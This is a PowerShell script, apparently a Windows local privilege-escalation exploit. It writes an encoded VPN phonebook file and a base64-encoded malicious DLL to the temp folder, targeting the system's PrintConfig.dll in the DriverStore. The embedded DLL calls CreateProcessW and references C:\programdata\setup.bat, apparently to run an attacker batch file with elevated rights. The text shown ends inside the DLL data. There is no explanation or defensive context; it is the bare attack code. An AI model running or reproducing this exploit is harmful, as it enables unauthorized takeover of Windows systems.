Import-Module ".\NtApiDotNet.dll" -ErrorAction Stop

$tmpDir = "$env:TMP\$(New-Guid)"
New-Item -ItemType Directory -Path $tmpDir|Out-Null

$tpath = "$env:TMP\$(New-Guid).tmp"
$evilDllPath = "$env:TMP\$(New-Guid).dll"
$outDllPath = "C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_4592475aca2acf83\Amd64\PrintConfig.dll"
$phonebook = "$env:TMP\$(New-Guid).pbk"

#put phonebook
[System.Text.Encoding]::UTF8.GetString([convert]::FromBase64String("W1ZQTlRFU1RdCkVuY29kaW5nPT
EKUEJWZXJzaW9uPTEKVHlwZT0yCkF1dG9Mb2dvbj0xClVzZVJhc0NyZWRlbnRpYWxzPTEKTG93RGF0ZVRpbWU9LTEzNDU4MzQzMjAKSGlnaERhdGVUaW1lPT
MwMjQ4NTQ0CkRpYWxQYXJhbXNVSUQ9ODQ5NDQxCkd1aWQ9MTc0NDYzQ0U2QUFGRDQ0NThGQzU3QTQ2NkE5NUI3ODcKVnBuU3RyYXRlZ3k9MQpFeGNsdWRlZF
Byb3RvY29scz0wCkxjcEV4dGVuc2lvbnM9MQpEYXRhRW5jcnlwdGlvbj04ClN3Q29tcHJlc3Npb249MApOZWdvdGlhdGVNdWx0aWxpbmtBbHdheXM9MApTa2
lwRG91YmxlRGlhbERpYWxvZz0wCkRpYWxNb2RlPTAKT3ZlcnJpZGVQcmVmPTE1ClJlZGlhbEF0dGVtcHRzPTMKUmVkaWFsU2Vjb25kcz02MApJZGxlRGlzY2
9ubmVjdFNlY29uZHM9MApSZWRpYWxPbkxpbmtGYWlsdXJlPTEKQ2FsbGJhY2tNb2RlPTAKQ3VzdG9tRGlhbERsbD0KQ3VzdG9tRGlhbEZ1bmM9CkN1c3RvbV
Jhc0RpYWxEbGw9CkZvcmNlU2VjdXJlQ29tcGFydG1lbnQ9MApEaXNhYmxlSUtFTmFtZUVrdUNoZWNrPTAKQXV0aGVudGljYXRlU2VydmVyPTAKU2hhcmVNc0
ZpbGVQcmludD0xCkJpbmRNc05ldENsaWVudD0xClNoYXJlZFBob25lTnVtYmVycz0wCkdsb2JhbERldmljZVNldHRpbmdzPTAKUHJlcmVxdWlzaXRlRW50cn
k9ClByZXJlcXVpc2l0ZVBiaz0KUHJlZmVycmVkUG9ydD1WUE4zLTAKUHJlZmVycmVkRGV2aWNlPVdBTiBNaW5pcG9ydCAoUFBUUCkKUHJlZmVycmVkQnBzPT
AKUHJlZmVycmVkSHdGbG93PTEKUHJlZmVycmVkUHJvdG9jb2w9MQpQcmVmZXJyZWRDb21wcmVzc2lvbj0xClByZWZlcnJlZFNwZWFrZXI9MQpQcmVmZXJyZW
RNZG1Qcm90b2NvbD0wClByZXZpZXdVc2VyUHc9MQpQcmV2aWV3RG9tYWluPTEKUHJldmlld1Bob25lTnVtYmVyPTAKU2hvd0RpYWxpbmdQcm9ncmVzcz0xCl
Nob3dNb25pdG9ySWNvbkluVGFza0Jhcj0xCkN1c3RvbUF1dGhLZXk9MApBdXRoUmVzdHJpY3Rpb25zPTU0NApJcFByaW9yaXRpemVSZW1vdGU9MQpJcEludG
VyZmFjZU1ldHJpYz0wCklwSGVhZGVyQ29tcHJlc3Npb249MApJcEFkZHJlc3M9MC4wLjAuMApJcERuc0FkZHJlc3M9MC4wLjAuMApJcERuczJBZGRyZXNzPT
AuMC4wLjAKSXBXaW5zQWRkcmVzcz0wLjAuMC4wCklwV2luczJBZGRyZXNzPTAuMC4wLjAKSXBBc3NpZ249MQpJcE5hbWVBc3NpZ249MQpJcERuc0ZsYWdzPT
AKSXBOQlRGbGFncz0xClRjcFdpbmRvd1NpemU9MApVc2VGbGFncz0yCklwU2VjRmxhZ3M9MApJcERuc1N1ZmZpeD0KSXB2NkFzc2lnbj0xCklwdjZBZGRyZX
NzPTo6CklwdjZQcmVmaXhMZW5ndGg9MApJcHY2UHJpb3JpdGl6ZVJlbW90ZT0xCklwdjZJbnRlcmZhY2VNZXRyaWM9MApJcHY2TmFtZUFzc2lnbj0xCklwdj
ZEbnNBZGRyZXNzPTo6CklwdjZEbnMyQWRkcmVzcz06OgpJcHY2UHJlZml4PTAwMDAwMDAwMDAwMDAwMDAKSXB2NkludGVyZmFjZUlkPTAwMDAwMDAwMDAwMD
AwMDAKRGlzYWJsZUNsYXNzQmFzZWREZWZhdWx0Um91dGU9MApEaXNhYmxlTW9iaWxpdHk9MApOZXR3b3JrT3V0YWdlVGltZT0wClByb3Zpc2lvblR5cGU9MA
pQcmVTaGFyZWRLZXk9CgpORVRDT01QT05FTlRTPQptc19tc2NsaWVudD0xCm1zX3NlcnZlcj0xCgpNRURJQT1yYXN0YXBpClBvcnQ9VlBOMy0wCkRldmljZT
1XQU4gTWluaXBvcnQgKFBQVFApCgpERVZJQ0U9dnBuClBob25lTnVtYmVyPTEyNy4wLjAuMQpBcmVhQ29kZT0KQ291bnRyeUNvZGU9MApDb3VudHJ5SUQ9MA
pVc2VEaWFsaW5nUnVsZXM9MApDb21tZW50PQpGcmllbmRseU5hbWU9Ckxhc3RTZWxlY3RlZFBob25lPTAKUHJvbW90ZUFsdGVybmF0ZXM9MApUcnlOZXh0QW
x0ZXJuYXRlT25GYWlsPTE=")) |Set-Content -force $phonebook

#put evil dll in temp
$dllb64="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YCoAAAAAAABEKgAAAAAAADAqAAAAAAAAFioAAAAAAAACKgAAAAAAAAAAAAAAAAAA5igAAAAAAAAeKQAAAAAAAP4oAAAAAAAAAAAAAAAAAABUKQAAAAAAAEYpAAAAAAAAOikAAAAAAACAKQAAAAAAAKIpAAAAAAAAvikAAAAAAABmKQAAAAAAANYpAAAAAAAAAAAAAAAAAADlAENyZWF0ZVByb2Nlc3NXAACGAENsb3NlSGFuZGxlAEtFUk5FTDMyLmRsbAAACABfX0Nfc3BlY2lmaWNfaGFuZGxlcgAAJQBfX3N0ZF90eXBlX2luZm9fZGVzdHJveV9saXN0AAA+AG1lbXNldAAAVkNSVU5USU1FMTQwLmRsbAAANgBfaW5pdHRlcm0ANwBfaW5pdHRlcm1fZQA/AF9zZWhfZmlsdGVyX2RsbAAYAF9jb25maWd1cmVfbmFycm93X2FyZ3YAADMAX2luaXRpYWxpemVfbmFycm93X2Vudmlyb25tZW50AAA0AF9pbml0aWFsaXplX29uZXhpdF90YWJsZQAAIgBfZXhlY3V0ZV9vbmV4aXRfdGFibGUAFgBfY2V4aXQAAGFwaS1tcy13aW4tY3J0LXJ1bnRpbWUtbDEtMS0wLmRsbADTBFJ0bENhcHR1cmVDb250ZXh0ANoEUnRsTG9va3VwRnVuY3Rpb25FbnRyeQAA4QRSdGxWaXJ0dWFsVW53aW5kAAC8BVVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAAewVTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAHQJHZXRDdXJyZW50UHJvY2VzcwCaBVRlcm1pbmF0ZVByb2Nlc3MAAIkDSXNQcm9jZXNzb3JGZWF0dXJlUHJlc2VudABQBFF1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyAB4CR2V0Q3VycmVudFByb2Nlc3NJZAAiAkdldEN1cnJlbnRUaHJlYWRJZAAA8AJHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQBsA0luaXRpYWxpemVTTGlzdEhlYWQAggNJc0RlYnVnZ2VyUHJlc2VudAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADNXSDSZtT//zKi3y2ZKwAA/////wAAAAABAAAAAgAAAC8gAAAAAAAAAPgAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAIEQAA4CUAACARAABBEQAA8CUAAEQRAACUEQAAjCYAAJQRAACqEgAA9CUAAKwSAAAwEwAAOCYAADATAABjFAAAlCYAAGQUAAChFAAAxCYAAKQUAADYFAAA6CYAANgUAACpFQAA1CYAAKwVAAAdFgAA3CYAACAWAADMFgAA8CYAAPgWAAATFwAAjCYAABQXAABNFwAAjCYAAFAXAACEFwAAjCYAAIQXAACZFwAAjCYAAJwXAADEFwAAjCYAAMQXAADZFwAAjCYAANwXAAA8GAAAJCcAADwYAABsGAAAjCYAAGwYAACAGAAAjCYAAIAYAADJGAAA6CYAAMwYAABXGQAA6CYAAFgZAADwGQAA/CYAAPAZAAAUGgAA6CYAABQaAAA9GgAA6CYAAFAaAACaGwAAOCcAAJwbAADYGwAASCcAANgbAAAUHAAASCcAABgcAAC5HQAAVCcAACAeAAA9HgAAjCYAAEAeAACbHgAAbCcAALAeAACyHgAAaCcAALIeAADJHgAAMCYAAMkeAADiHgAAMCYAAOIeAAD2HgAAMCYAAPYeAAAsHwAAvCYAACwfAABEHwAAHCcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABgAAAAYAACAAAAAAAAAAAAAAAAAAAABAAIAAAAwAACAAAAAAAAAAAAAAAAAAAABAAkEAABIAAAAYFAAAJEAAAAAAAAAAAAAAAAAAAAAAAAAPD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnIHN0YW5kYWxvbmU9J3llcyc/Pg0KPGFzc2VtYmx5IHhtbG5zPSd1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MScgbWFuaWZlc3RWZXJzaW9uPScxLjAnPg0KPC9hc3NlbWJseT4NCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA